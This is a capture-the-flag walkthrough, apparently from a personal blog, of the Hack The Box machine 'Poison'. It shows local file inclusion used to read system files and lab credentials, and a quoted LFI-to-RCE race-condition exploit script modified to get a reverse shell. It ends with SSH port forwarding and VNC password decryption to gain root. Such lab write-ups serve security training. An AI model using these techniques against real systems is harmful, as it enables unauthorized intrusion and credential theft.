---
"title": "Hack The Box - Poison"
"date": 2020-07-22
"tags": ["freebsd", "medium", "vnc", "lfi", "race_condition"]
"keywords": ["freebsd", "medium", "vnc", "lfi", "race_condition"]
"categories": ["HackTheBox OSCP-Like"]
"author": "Ghostbyt3"
"description": "Poison is an Medium box, getting initial is by finding the LFI and doing race condition or we can get the ssh password of the user directly by decoding the base64 and root is port forwarding VNC to our machine and login it as root."
"featured_image": "/img/htb-poison/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox OSCP-Like - Writeup"
---


![Untitled](/img/htb-poison/Untitled.png)

Poison is an Medium box, getting initial is by finding the LFI and doing race condition or we can get the ssh password of the user directly by decoding the base64 and root is port forwarding VNC to our machine and login it as root.

Link: [https://www.hackthebox.eu/home/machines/profile/132](https://www.hackthebox.eu/home/machines/profile/132)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  ssl/http Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 9.1-STABLE (92%), FreeBSD 7.0-RELEASE (91%), FreeBSD 12.0-CURRENT (90%), Sony Playstation 4 or FreeBSD 10.2-RELEASE (90%), FreeBSD 7.0-RELEASE-p2 - 7.1-PRERELEASE (89%), FreeNAS 9.10 (FreeBSD 10.3-STABLE) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   203.44 ms 10.10.14.1
2   203.51 ms 10.10.10.84
```

## HTTP Enumeration

This webpage contains some php files, the `Scriptname` will helps us to diplay them.

![Untitled](/img/htb-poison/Untitled%201.png)

Here I tried to view `phpinfo` and it actually worked and also note that parameter helps to locate the files.

![Untitled](/img/htb-poison/Untitled%202.png)

Likewise I started checking all the files. Here we can see one more file called `pwdbackup.txt`

![Untitled](/img/htb-poison/Untitled%203.png)

## Getting User Shell

### Method 1

Checking that file reveals that it contains some base64 encoded stuff and its 13times encoded.

![Untitled](/img/htb-poison/Untitled%204.png)

So I just decoded that multiple times using CyberChef and I got a password thing.

![Untitled](/img/htb-poison/Untitled%205.png)

We know the `backup.php` uses a parameter called `file` so I tried for any LFI possible and I got `/etc/passwd` Here can see another user called charix.

![Untitled](/img/htb-poison/Untitled%206.png)

Tried login with ssh with the creds we got `charix : Charix!2#4%6&8(0`

![Untitled](/img/htb-poison/Untitled%207.png)

### Method 2

We know that we can view PHP Info and there is also LFI and  that uses race condition and can turn an LFI vulnerability to a remote code execution (RCE) vulnerability. There is a python script for this.

> [https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py](https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py)

And I changed some few things.

- Give the exact location of phpinfo.php
- Change the GET request to /browse.php?file= because this is where we found LFI

```py
REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /browse.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
```

- Added my IP address and the port which I need to Listen

Now if I run the script

![Untitled](/img/htb-poison/Untitled%208.png)

I got the shell as `www`

## Privilege Escalation

When checking the home directory, I found `secret.zip`

![Untitled](/img/htb-poison/Untitled%209.png)

Downloaded to my machine and extracted that, it asked for password and I used the same Charix ssh password and it extracted.

![Untitled](/img/htb-poison/Untitled%2010.png)

But the file looks different.

When checking the running process, I found that VNC is running as root.

```bash
charix@Poison:~ % ps aux
.
.
.
root    529   0.0  0.9  23620  9064 v0- I    05:59     0:00.22 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800
```

I checked whether the port is open and port 5901 is the port usually VNC runs.

```bash
charix@Poison:~/.vnc % netstat -an
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.64487      10.10.14.20.3333       ESTABLISHED
tcp4       0      0 10.10.10.84.80         10.10.14.20.41928      CLOSE_WAIT
tcp4       0     44 10.10.10.84.22         10.10.14.20.36254      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*
```

So I did a local port forwarding of the port 5901 to my machine.

```bash
root@kali:~/CTF/HTB/Boxes/Poison# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

Now We can try connecting to it by using vncviewer and it asks for password, So I guessed that the `secret` file we got from the zip can be password.

![Untitled](/img/htb-poison/Untitled%2011.png)

And It worked I logged in as root.

![Untitled](/img/htb-poison/Untitled%2012.png)

We own the box!!

We can decrypt the VNC password using this [tool](https://github.com/trinitronx/vncpasswd.py).

```bash
root@kali:~/CTF/HTB/Boxes/Poison/vncpasswd.py# python vncpasswd.py -d -f secret
Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'
```